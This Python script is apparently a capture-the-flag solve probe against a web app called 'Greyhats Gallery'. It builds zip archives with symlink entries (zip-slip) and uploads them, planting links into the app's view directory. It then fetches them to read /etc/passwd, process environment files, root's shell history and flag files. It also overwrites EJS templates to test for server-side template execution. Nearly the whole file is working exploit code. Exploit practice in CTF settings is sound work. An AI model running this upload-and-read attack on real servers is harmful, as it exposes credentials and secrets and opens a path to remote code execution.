#!/usr/bin/env python3
"""Empirical probe of Greyhats Gallery live instance.

Two-stage zip-slip-via-symlink to plant SYMLINK + FILE entries into /app/views,
then GET each to learn the real read/compile/overwrite behaviour.

Usage: uv run python solve/probe_live.py http://<host>/
"""
import io
import sys
import zipfile

import requests

UA = {"User-Agent": "probe"}


def zinfo_symlink(name: str):
    zi = zipfile.ZipInfo(name)
    zi.create_system = 3
    zi.external_attr = (0o120777 & 0xFFFF) << 16  # S_IFLNK
    return zi


def zinfo_file(name: str):
    zi = zipfile.ZipInfo(name)
    zi.create_system = 3
    zi.external_attr = (0o100644 & 0xFFFF) << 16
    return zi


def build(entries) -> bytes:
    """entries: list of (kind, name, data) kind in {'sym','file'}."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        for kind, name, data in entries:
            zi = zinfo_symlink(name) if kind == "sym" else zinfo_file(name)
            z.writestr(zi, data)
    return buf.getvalue()


def upload(base, blob, fname):
    r = requests.post(
        f"{base}/upload",
        files={"photos": (fname, blob, "application/zip")},
        allow_redirects=False,
        timeout=30,
        headers=UA,
    )
    return r.status_code, r.headers.get("location", "")


def get(base, path):
    r = requests.get(f"{base}{path}", timeout=30, headers=UA, allow_redirects=False)
    return r


# symlink view-name -> target file (read probes)
READ_TARGETS = {
    "p_passwd": "/etc/passwd",
    "p_hostname": "/etc/hostname",
    "p_env1": "/proc/1/environ",
    "p_cmd1": "/proc/1/cmdline",
    "p_selfenv": "/proc/self/environ",
    "p_selfcmd": "/proc/self/cmdline",
    "p_selfmaps": "/proc/self/maps",
    "p_root": "/",
    "p_selfroot": "/proc/self/root",
    "p_proc1root": "/proc/1/root",
    "p_server": "/app/src/server.js",
    "p_flagfixed": "/flag.txt",
    "p_flagbare": "/flag",
    "p_rooth": "/root/.bash_history",
}


def main():
    base = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://127.0.0.1:34267"

    # stage 1: drop the dir-symlink v -> ../views
    print("== stage1: v -> ../views ==")
    print(upload(base, build([("sym", "v", "../views")]), "a1.zip"))

    # stage 2: symlink read-probes + overwrite test + raw-serve test
    entries = [("sym", f"v/{name}.ejs", tgt) for name, tgt in READ_TARGETS.items()]
    # raw-serve sanity: a fresh view should be served raw (not compiled)
    entries.append(("file", "v/probe_raw.ejs", "RAW_MARK<%= 7*7 %>RAW_END"))
    # overwrite test: try to clobber an allowlisted view -> if it compiles our code, perms differ
    entries.append(("file", "v/error.ejs", "OWN_ERR<%= 7*7 %>OWN_END"))
    entries.append(("file", "v/index.ejs", "OWN_IDX<%= 7*7 %>OWN_END"))
    print("== stage2: symlinks + overwrite test ==")
    print(upload(base, build(entries), "a2.zip"))

    print("\n== READ PROBES ==")
    for name, tgt in READ_TARGETS.items():
        r = get(base, f"/{name}")
        body = r.content[:400]
        # strip noise
        print(f"\n--- /{name}  -> {tgt}  [{r.status_code}] len={len(r.content)}")
        try:
            print(body.decode("utf-8", "replace"))
        except Exception:
            print(body)

    print("\n== RAW-SERVE SANITY (/probe_raw) ==")
    r = get(base, "/probe_raw")
    print(f"[{r.status_code}] {r.content[:200]!r}")

    print("\n== OVERWRITE TEST: GET / (index) ==")
    r = get(base, "/")
    snip = r.content[:300]
    print(f"[{r.status_code}] starts: {snip!r}")
    print("index overwritten?", b"OWN_IDX" in r.content, "compiled(49)?", b"OWN_IDX49" in r.content)

    print("\n== OVERWRITE TEST: GET /nope (error.ejs) ==")
    r = get(base, "/this_page_does_not_exist_xyz")
    print(f"[{r.status_code}] {r.content[:300]!r}")
    print("error overwritten?", b"OWN_ERR" in r.content, "compiled(49)?", b"OWN_ERR49" in r.content)


if __name__ == "__main__":
    main()
